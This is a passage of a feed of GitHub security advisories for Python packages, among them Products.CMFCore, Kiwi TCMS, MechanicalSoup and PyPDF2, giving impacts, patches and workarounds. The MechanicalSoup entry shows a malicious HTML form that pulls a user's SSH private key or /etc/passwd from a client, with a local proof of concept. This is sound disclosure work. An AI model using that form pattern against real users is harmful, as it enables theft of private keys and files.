        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The use of Python's marshal module to handle unchecked input in a public method on <code>PortalFolder</code> objects can lead to an unauthenticated denial of service and crash situation. The code in question is exposed by all portal software built on top of <code>Products.CMFCore</code>, such as Plone. All deployments are vulnerable.</p>
<h3 id="patches">Patches</h3>
<p>The code has been fixed in <code>Products.CMFCore</code> version 3.2.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Users can make the affected <code>decodeFolderFilter</code> method unreachable by editing the <code>PortalFolder.py</code> module in <code>Products.CMFCore</code> by hand and then restarting Zope. Go to line 233 of <code>PortalFolder.py</code> and remove both the <code>@security.public</code> decorator for <code>decodeFolderFilter</code> as well as the method's entire docstring. This is safe because the method is not actually used by current code.</p>
<h3 id="references">References</h3>
<ul>
<li>Products.CMFCore security advisory <a href="https://github.com/zopefoundation/Products.CMFCore/security/advisories/GHSA-4hpj-8rhv-9x87">GHSA-4hpj-8rhv-9x87</a></li>
</ul>
<h3 id="credits">Credits</h3>
<p>Thanks go to Nicolas VERDIER from onepoint.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in the <a href="https://github.com/zopefoundation/Products.CMFCore/issues">Products.CMFCore issue tracker</a></li>
<li>Email us at <a href="mailto:security@plone.org">security@plone.org</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/zopefoundation/Products.CMFCore/security/advisories/GHSA-4hpj-8rhv-9x87">https://github.com/zopefoundation/Products.CMFCore/security/advisories/GHSA-4hpj-8rhv-9x87</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36814">https://nvd.nist.gov/vuln/detail/CVE-2023-36814</a></li>
<li><a href="https://github.com/zopefoundation/Products.CMFCore/commit/40f03f43a60f28ca9485c8ef429efef729be54e5">https://github.com/zopefoundation/Products.CMFCore/commit/40f03f43a60f28ca9485c8ef429efef729be54e5</a></li>
<li><a href="https://github.com/advisories/GHSA-4hpj-8rhv-9x87">https://github.com/advisories/GHSA-4hpj-8rhv-9x87</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4hpj-8rhv-9x87</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-07-05T22:42:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[kiwitcms] Kiwi TCMS's misconfigured HTTP headers allow stored XSS execution with Firefox]]></title>
        <id>https://github.com/advisories/GHSA-jpgw-2r9m-8qfw</id>
        <link href="https://github.com/advisories/GHSA-jpgw-2r9m-8qfw"/>
        <updated>2023-07-06T16:00:36.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Kiwi TCMS allows users to upload attachments to test plans, test cases, etc. Earlier versions of Kiwi TCMS had introduced
changes which were meant to serve all uploaded files as plain text in order to prevent browsers from executing potentially dangerous files when such files are accessed directly! </p>
<p>The previous Nginx configuration was incorrect allowing certain browsers like Firefox to ignore the <code>Content-Type: text/plain</code> header on some occasions thus allowing potentially dangerous scripts to be executed. </p>
<p>Additionally file upload validators and parts of the HTML rendering code have been found to require additional sanitation and improvements.</p>
<h3 id="patches">Patches</h3>
<ul>
<li>Updated Nginx content type configuration</li>
<li>Improved file upload validation code to prevent more potentially dangerous uploads</li>
<li>Sanitization of test plan names used in the <code>tree_view_html()</code> function</li>
</ul>
<h3 id="references">References</h3>
<p>Disclosed by <a href="https://huntr.dev/bounties/511489dd-ba38-4806-9029-b28ab2830aa8/">M Nadeem Qazi</a> and
<a href="https://huntr.dev/bounties/c6eeb346-fa99-4d41-bc40-b68f8d689223/">Mahshooq Zubair</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/kiwitcms/Kiwi/security/advisories/GHSA-jpgw-2r9m-8qfw">https://github.com/kiwitcms/Kiwi/security/advisories/GHSA-jpgw-2r9m-8qfw</a></li>
<li><a href="https://github.com/kiwitcms/kiwi/commit/195ea53eaaf360c19227c864cc0fe58910032c3c">https://github.com/kiwitcms/kiwi/commit/195ea53eaaf360c19227c864cc0fe58910032c3c</a></li>
<li><a href="https://github.com/kiwitcms/kiwi/commit/ffb00450be52fe11a82a2507632c2328cae4ec9d">https://github.com/kiwitcms/kiwi/commit/ffb00450be52fe11a82a2507632c2328cae4ec9d</a></li>
<li><a href="https://huntr.dev/bounties/511489dd-ba38-4806-9029-b28ab2830aa8/">https://huntr.dev/bounties/511489dd-ba38-4806-9029-b28ab2830aa8/</a></li>
<li><a href="https://huntr.dev/bounties/c6eeb346-fa99-4d41-bc40-b68f8d689223/">https://huntr.dev/bounties/c6eeb346-fa99-4d41-bc40-b68f8d689223/</a></li>
<li><a href="https://kiwitcms.org/blog/kiwi-tcms-team/2023/07/04/kiwi-tcms-125/">https://kiwitcms.org/blog/kiwi-tcms-team/2023/07/04/kiwi-tcms-125/</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36809">https://nvd.nist.gov/vuln/detail/CVE-2023-36809</a></li>
<li><a href="https://www.github.com/kiwitcms/kiwi/commit/195ea53eaaf360c19227c864cc0fe58910032c3c">https://www.github.com/kiwitcms/kiwi/commit/195ea53eaaf360c19227c864cc0fe58910032c3c</a></li>
<li><a href="https://www.github.com/kiwitcms/kiwi/commit/ffb00450be52fe11a82a2507632c2328cae4ec9d">https://www.github.com/kiwitcms/kiwi/commit/ffb00450be52fe11a82a2507632c2328cae4ec9d</a></li>
<li><a href="https://github.com/advisories/GHSA-jpgw-2r9m-8qfw">https://github.com/advisories/GHSA-jpgw-2r9m-8qfw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jpgw-2r9m-8qfw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-07-05T22:40:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[MechanicalSoup] MechanicalSoup vulnerable to malicious web server reading arbitrary files on client using file input inside HTML form]]></title>
        <id>https://github.com/advisories/GHSA-x456-3ccm-m6j4</id>
        <link href="https://github.com/advisories/GHSA-x456-3ccm-m6j4"/>
        <updated>2023-07-05T21:35:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A malicious web server can read arbitrary files on the client using a <code>&lt;input type="file" ...&gt;</code> inside HTML form.</p>
<h3 id="details">Details</h3>
<p>This affects the extremely common pattern of form submission:</p>
<pre><code class="language-python">b = mechanicalsoup.StatefulBrowser()
b.select_form(...)
b.submit_selected()
</code></pre>
<p>The problem is with the code in <code>browser.Browser.get_request_kwargs</code>:</p>
<pre><code class="language-python">    if tag.get("type", "").lower() == "file" and multipart:
        filepath = value
        if filepath != "" and isinstance(filepath, str):
            content = open(filepath, "rb")
        else:
            content = ""
        filename = os.path.basename(filepath)
        # If value is the empty string, we still pass it
        # for consistency with browsers (see
        # https://github.com/MechanicalSoup/MechanicalSoup/issues/250).
        files[name] = (filename, content)
</code></pre>
<p>The file path is taken from the bs4 tag "value" attribute. However, this path will default to whatever the server sends. So if a malicious web server were to send something like:</p>
<pre><code class="language-html">&lt;html&gt;&lt;body&gt;
  &lt;form method="post" enctype="multipart/form-data"&gt;
    &lt;input type="text" name="greeting" value="hello" /&gt;
    &lt;input type="file" name="evil" value="/home/user/.ssh/id_rsa" /&gt;
  &lt;/form&gt;
&lt;/body&gt;&lt;/html&gt;
</code></pre>
<p>then upon <code>.submit_selected()</code> the mechanicalsoup browser will happily send over the contents of your SSH private key.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-python">import attr
import mechanicalsoup
import requests


class NevermindError(Exception):
    pass


@attr.s
class FakeSession:
    session = attr.ib()

    headers = property(lambda self: self.session.headers)

    def request(self, *args, **kwargs):
        print("requested", args, kwargs)
        raise NevermindError  # don't actually send request


def demonstrate(inputs=None):
    b = mechanicalsoup.StatefulBrowser(FakeSession(requests.Session()))
    b.open_fake_page("""\
&lt;html&gt;&lt;body&gt;
&lt;form method="post" enctype="multipart/form-data"&gt;
&lt;input type="text" name="greeting" value="hello" /&gt;
&lt;input type="file" name="evil" value="/etc/passwd" /&gt;
&lt;input type="file" name="second" /&gt;
&lt;/form&gt;
&lt;/body&gt;&lt;/html&gt;
""", url="http://127.0.0.1:9/")
    b.select_form()
    if inputs is not None:
        b.form.set_input(inputs)
    try:
        b.submit_selected()
    except NevermindError:
        pass

# %%

# unpatched
demonstrate()
# OUTPUT: requested () {'method': 'post', 'url': 'http://127.0.0.1:9/', 'files': {'evil': ('passwd', &lt;_io.BufferedReader name='/etc/passwd'&gt;), 'second': ('', '')}, 'headers': {'Referer': 'http://127.0.0.1:9/'}, 'data': [('greeting', 'hello')]}

# %%

# with the patch, this now works. users MUST open the file manually and
# use browser.set_input() using the file object.
demonstrate({"greeting": "hiya", "evil": open("/etc/hostname", "rb").name, "second": open("/dev/null", "rb")})
# OUTPUT: requested () {'method': 'post', 'url': 'http://127.0.0.1:9/', 'files': {'evil': ('hostname', &lt;_io.BufferedReader name='/etc/hostname'&gt;), 'second': ('null', &lt;_io.BufferedReader name='/dev/null'&gt;)}, 'headers': {'Referer': 'http://127.0.0.1:9/'}, 'data': [('greeting', 'hiya')]}

# %%

# with the patch, this raises a ValueError with a helpful string
demonstrate({"evil": "/etc/hostname"})

# %%

# with the patch, we silently send no file if a malicious server tries the attack:
demonstrate()
</code></pre>
<h3 id="suggested-patch">Suggested patch</h3>
<pre><code class="language-diff">diff --git a/mechanicalsoup/browser.py b/mechanicalsoup/browser.py
index 285f8bb..68bc65e 100644
--- a/mechanicalsoup/browser.py
+++ b/mechanicalsoup/browser.py
@@ -1,7 +1,8 @@
+import io
 import os
 import tempfile
 import urllib
 import weakref
 import webbrowser
 
 import bs4
@@ -227,15 +228,21 @@ class Browser:
                     value = tag.get("value", "")
 
                 # If the enctype is not multipart, the filename is put in
                 # the form as a text input and the file is not sent.
                 if tag.get("type", "").lower() == "file" and multipart:
                     filepath = value
                     if filepath != "" and isinstance(filepath, str):
-                        content = open(filepath, "rb")
+                        content = getattr(tag, "_mechanicalsoup_file", None)
+                        if content is False:
+                            raise ValueError(
+                                """From v1.3.0 onwards, you must pass an open file object directly, for example using `form.set_input({"name": open("/path/to/filename", "rb")})`. This change is to mitigate a security vulnerability where a malicious web server could read arbitrary files from the client."""
+                            )
+                        elif not isinstance(content, io.IOBase):
+                            content = ""
                     else:
                         content = ""
                     filename = os.path.basename(filepath)
                     # If value is the empty string, we still pass it
                     # for consistency with browsers (see
                     # https://github.com/MechanicalSoup/MechanicalSoup/issues/250).
                     files[name] = (filename, content)
diff --git a/mechanicalsoup/form.py b/mechanicalsoup/form.py
index a67195c..82f6015 100644
--- a/mechanicalsoup/form.py
+++ b/mechanicalsoup/form.py
@@ -1,8 +1,9 @@
 import copy
+import io
 import warnings
 
 from bs4 import BeautifulSoup
 
 from .utils import LinkNotFoundError
 
 
@@ -64,15 +65,24 @@ class Form:
         give it the value ``password``.
         """
 
         for (name, value) in data.items():
             i = self.form.find("input", {"name": name})
             if not i:
                 raise InvalidFormMethod("No input field named " + name)
-            i["value"] = value
+
+            if isinstance(value, io.IOBase):
+                # Store the actual file object for &lt;input type="file"&gt;
+                i._mechanicalsoup_file = value
+                i["value"] = value.name
+            else:
+                # We set `_mechanicalsoup_file` to `False` so that we can
+                # check for deprecated use of the API.
+                i._mechanicalsoup_file = False
+                i["value"] = value
 
     def uncheck_all(self, name):
         """Remove the *checked*-attribute of all input elements with
         a *name*-attribute given by ``name``.
         """
         for option in self.form.find_all("input", {"name": name}):
             if "checked" in option.attrs:
@@ -257,20 +267,20 @@ class Form:
         .. code-block:: python
 
             form.set("login", username)
             form.set("password", password)
             form.set("eula-checkbox", True)
 
         Example: uploading a file through a ``&lt;input type="file"
-        name="tagname"&gt;`` field (provide the path to the local file,
+        name="tagname"&gt;`` field (provide an open file object,
         and its content will be uploaded):
 
         .. code-block:: python
 
-            form.set("tagname", path_to_local_file)
+            form.set("tagname", open(path_to_local_file, "rb"))
 
         """
         for func in ("checkbox", "radio", "input", "textarea", "select"):
             try:
                 getattr(self, "set_" + func)({name: value})
                 return
             except InvalidFormMethod:
</code></pre>
<h3 id="impact">Impact</h3>
<p>All users of MechanicalSoup's form submission are affected, unless they took very specific (and manual) steps to reset HTML form field values.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MechanicalSoup/MechanicalSoup/security/advisories/GHSA-x456-3ccm-m6j4">https://github.com/MechanicalSoup/MechanicalSoup/security/advisories/GHSA-x456-3ccm-m6j4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-34457">https://nvd.nist.gov/vuln/detail/CVE-2023-34457</a></li>
<li><a href="https://github.com/MechanicalSoup/MechanicalSoup/commit/d57c4a269bba3b9a0c5bfa20292955b849006d9e">https://github.com/MechanicalSoup/MechanicalSoup/commit/d57c4a269bba3b9a0c5bfa20292955b849006d9e</a></li>
<li><a href="https://github.com/MechanicalSoup/MechanicalSoup/releases/tag/v1.3.0">https://github.com/MechanicalSoup/MechanicalSoup/releases/tag/v1.3.0</a></li>
<li><a href="https://github.com/advisories/GHSA-x456-3ccm-m6j4">https://github.com/advisories/GHSA-x456-3ccm-m6j4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x456-3ccm-m6j4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-05T21:35:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[petl] XML Injection in petl]]></title>
        <id>https://github.com/advisories/GHSA-69q2-p9xp-739v</id>
        <link href="https://github.com/advisories/GHSA-69q2-p9xp-739v"/>
        <updated>2023-07-05T21:07:37.000Z</updated>
        <content type="html"><![CDATA[<p>petl before 1.68, in some configurations, allows resolution of entities in an XML document.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/petl-developers/petl/security/advisories/GHSA-f5gc-p5m3-v347">https://github.com/petl-developers/petl/security/advisories/GHSA-f5gc-p5m3-v347</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-29128">https://nvd.nist.gov/vuln/detail/CVE-2020-29128</a></li>
<li><a href="https://github.com/petl-developers/petl/issues/526">https://github.com/petl-developers/petl/issues/526</a></li>
<li><a href="https://github.com/petl-developers/petl/pull/527">https://github.com/petl-developers/petl/pull/527</a></li>
<li><a href="https://github.com/petl-developers/petl/pull/527/commits/1b0a09f08c3cdfe2e69647bd02f97c1367a5b5f8">https://github.com/petl-developers/petl/pull/527/commits/1b0a09f08c3cdfe2e69647bd02f97c1367a5b5f8</a></li>
<li><a href="https://github.com/nvn1729/advisories/blob/master/cve-2020-29128.md">https://github.com/nvn1729/advisories/blob/master/cve-2020-29128.md</a></li>
<li><a href="https://github.com/petl-developers/petl/compare/v1.6.7...v1.6.8">https://github.com/petl-developers/petl/compare/v1.6.7...v1.6.8</a></li>
<li><a href="https://petl.readthedocs.io/en/stable/changes.html">https://petl.readthedocs.io/en/stable/changes.html</a></li>
<li><a href="https://github.com/advisories/GHSA-69q2-p9xp-739v">https://github.com/advisories/GHSA-69q2-p9xp-739v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-69q2-p9xp-739v</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2021-04-20T16:32:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[grpcio] Connection confusion in gRPC]]></title>
        <id>https://github.com/advisories/GHSA-cfgp-2977-2fmm</id>
        <link href="https://github.com/advisories/GHSA-cfgp-2977-2fmm"/>
        <updated>2023-07-06T18:12:50.000Z</updated>
        <content type="html"><![CDATA[<p>When gRPC HTTP2 stack raised a header size exceeded error, it skipped parsing the rest of the HPACK frame. This caused any HPACK table mutations to also be skipped, resulting in a desynchronization of HPACK tables between sender and receiver. If leveraged, say, between a proxy and a backend, this could lead to requests from the proxy being interpreted as containing headers from different proxy clients - leading to an information leak that can be used for privilege escalation or data exfiltration. We recommend upgrading beyond the commit contained in&nbsp; <a href="https://github.com/grpc/grpc/pull/32309">https://github.com/grpc/grpc/pull/32309</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-32731">https://nvd.nist.gov/vuln/detail/CVE-2023-32731</a></li>
<li><a href="https://github.com/grpc/grpc/pull/32309">https://github.com/grpc/grpc/pull/32309</a></li>
<li><a href="https://github.com/grpc/grpc/pull/33005">https://github.com/grpc/grpc/pull/33005</a></li>
<li><a href="https://github.com/advisories/GHSA-cfgp-2977-2fmm">https://github.com/advisories/GHSA-cfgp-2977-2fmm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cfgp-2977-2fmm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-07-05T19:12:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[request-util] Forwarding of confidentials headers to third parties in fluture-node]]></title>
        <id>https://github.com/advisories/GHSA-32x6-qvw6-mxj4</id>
        <link href="https://github.com/advisories/GHSA-32x6-qvw6-mxj4"/>
        <updated>2023-07-05T17:01:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Using <code>followRedirects</code> or <code>followRedirectsWith</code> with any of the redirection strategies built into fluture-node 4.0.0 or 4.0.1, paired with a request that includes confidential headers such as Authorization or Cookie, exposes you to a vulnerability where, if the destination server were to redirect the request to a server on a third-party domain, or the same domain over unencrypted HTTP, the headers would be included in the follow-up request and be exposed to the third party, or potential http traffic sniffing.</p>
<h3 id="patches">Patches</h3>
<p>The redirection strategies made available in version 4.0.2 automatically redact confidential headers when a redirect is followed across to another origin.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Use a custom redirection strategy via the <code>followRedirectsWith</code> function. The custom strategy can be based on the new strategies available in <a href="mailto:fluture-node@4.0.2">fluture-node@4.0.2</a>.</p>
<h3 id="references">References</h3>
<ul>
<li>This vulnerability was discovered after the announcement of similar vulnerabilities in the <code>follow-redirects</code> package. There is more information there: <a href="https://github.com/advisories/GHSA-74fj-2j2h-c42q">https://github.com/advisories/GHSA-74fj-2j2h-c42q</a> and <a href="https://huntr.dev/bounties/7cf2bf90-52da-4d59-8028-a73b132de0db/">https://huntr.dev/bounties/7cf2bf90-52da-4d59-8028-a73b132de0db/</a></li>
<li>Fixed in 125e4474f910c1507f8ec3232848626fbc0f55c4 and 0c99bc511533d48be17dc6bfe641f7d0aeb34d77</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/fluture-js/fluture-node/security/advisories/GHSA-32x6-qvw6-mxj4">https://github.com/fluture-js/fluture-node/security/advisories/GHSA-32x6-qvw6-mxj4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-24719">https://nvd.nist.gov/vuln/detail/CVE-2022-24719</a></li>
<li><a href="https://github.com/psf/requests/pull/4718">https://github.com/psf/requests/pull/4718</a></li>
<li><a href="https://github.com/fluture-js/fluture-node/commit/0c99bc511533d48be17dc6bfe641f7d0aeb34d77">https://github.com/fluture-js/fluture-node/commit/0c99bc511533d48be17dc6bfe641f7d0aeb34d77</a></li>
<li><a href="https://github.com/fluture-js/fluture-node/commit/125e4474f910c1507f8ec3232848626fbc0f55c4">https://github.com/fluture-js/fluture-node/commit/125e4474f910c1507f8ec3232848626fbc0f55c4</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/request-util/PYSEC-2022-43052.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/request-util/PYSEC-2022-43052.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-32x6-qvw6-mxj4">https://github.com/advisories/GHSA-32x6-qvw6-mxj4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-32x6-qvw6-mxj4</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-03-01T22:14:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[PyPDF2] PyPDF2 vulnerable to possible Infinite Loop when reading malformed objects]]></title>
        <id>https://github.com/advisories/GHSA-hm9v-vj3r-r55m</id>
        <link href="https://github.com/advisories/GHSA-hm9v-vj3r-r55m"/>
        <updated>2023-06-30T22:19:40.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker who uses this vulnerability can craft a PDF which leads to an infinite loop.
This infinite loop blocks the current process and can utilize a single core of the CPU by 100%. It does not affect memory usage. That is, for example, the case if the user extracted metadata from such a malformed PDF.</p>
<h3 id="patches">Patches</h3>
<p>The issue was fixed with <a href="https://github.com/py-pdf/pypdf/pull/1331">https://github.com/py-pdf/pypdf/pull/1331</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot update your version of <code>PyPDF2</code> (preferably to <code>pypdf&gt;3.1.0</code> as PyPDF2 is deprecated), you should modify <code>PyPDF2/generic/_data_structures.py::read_object</code>.</p>
<p>Replace:</p>
<pre><code class="language-python">    else:
        # number object OR indirect reference
        peek = stream.read(20)
        stream.seek(-len(peek), 1)  # reset to start
        if IndirectPattern.match(peek) is not None:
            return IndirectObject.read_from_stream(stream, pdf)
        else:
            return NumberObject.read_from_stream(stream)
</code></pre>
<p>by</p>
<pre><code class="language-python">    elif tok in b"0123456789+-.":
        # number object OR indirect reference
        peek = stream.read(20)
        stream.seek(-len(peek), 1)  # reset to start
        if IndirectPattern.match(peek) is not None:
            return IndirectObject.read_from_stream(stream, pdf)
        else:
            return NumberObject.read_from_stream(stream)
    else:
        raise PdfReadError(
            f"Invalid Elementary Object starting with {tok} @{stream.tell()}"
        )
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/py-pdf/pypdf/issues/1329">pypdf issue #1329</a></li>
<li><a href="https://github.com/py-pdf/pypdf/pull/1331">pypdf PR #1331</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/py-pdf/pypdf/security/advisories/GHSA-hm9v-vj3r-r55m">https://github.com/py-pdf/pypdf/security/advisories/GHSA-hm9v-vj3r-r55m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36807">https://nvd.nist.gov/vuln/detail/CVE-2023-36807</a></li>
<li><a href="https://github.com/py-pdf/pypdf/issues/1329">https://github.com/py-pdf/pypdf/issues/1329</a></li>
<li><a href="https://github.com/py-pdf/pypdf/pull/1331">https://github.com/py-pdf/pypdf/pull/1331</a></li>
<li><a href="https://github.com/py-pdf/pypdf/commit/e6531a25325e7e0174b6a1ba03b57320b5227f6b">https://github.com/py-pdf/pypdf/commit/e6531a25325e7e0174b6a1ba03b57320b5227f6b</a></li>
<li><a href="https://github.com/advisories/GHSA-hm9v-vj3r-r55m">https://github.com/advisories/GHSA-hm9v-vj3r-r55m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hm9v-vj3r-r55m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-06-30T22:19:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[PyPDF2] PyPDF2 quadratic runtime with malformed PDF missing xref marker]]></title>
        <id>https://github.com/advisories/GHSA-jrm6-h9cq-8gqw</id>
        <link href="https://github.com/advisories/GHSA-jrm6-h9cq-8gqw"/>
        <updated>2023-06-30T22:17:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker who uses this vulnerability can craft a PDF which leads to unexpected long runtime.
This quadratic runtime blocks the current process and can utilize a single core of the CPU by 100%. It does not affect memory usage.</p>
<h3 id="patches">Patches</h3>
<p><a href="https://github.com/py-pdf/pypdf/pull/808">https://github.com/py-pdf/pypdf/pull/808</a></p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/py-pdf/pypdf/pull/808">PyPDF2 PR #808</a></li>
<li><a href="https://github.com/py-pdf/pypdf/issues/582">PyPDF2 Issue #582</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/py-pdf/pypdf/security/advisories/GHSA-jrm6-h9cq-8gqw">https://github.com/py-pdf/pypdf/security/advisories/GHSA-jrm6-h9cq-8gqw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36810">https://nvd.nist.gov/vuln/detail/CVE-2023-36810</a></li>
<li><a href="https://github.com/py-pdf/pypdf/issues/582">https://github.com/py-pdf/pypdf/issues/582</a></li>
<li><a href="https://github.com/py-pdf/pypdf/pull/808">https://github.com/py-pdf/pypdf/pull/808</a></li>
<li><a href="https://github.com/py-pdf/pypdf/commit/c6c56f550bb384e05f0139c796ba1308837d6373">https://github.com/py-pdf/pypdf/commit/c6c56f550bb384e05f0139c796ba1308837d6373</a></li>
<li><a href="https://github.com/advisories/GHSA-jrm6-h9cq-8gqw">https://github.com/advisories/GHSA-jrm6-h9cq-8gqw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jrm6-h9cq-8gqw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-06-30T22:17:52.000Z</published>
    </entry>
</feed>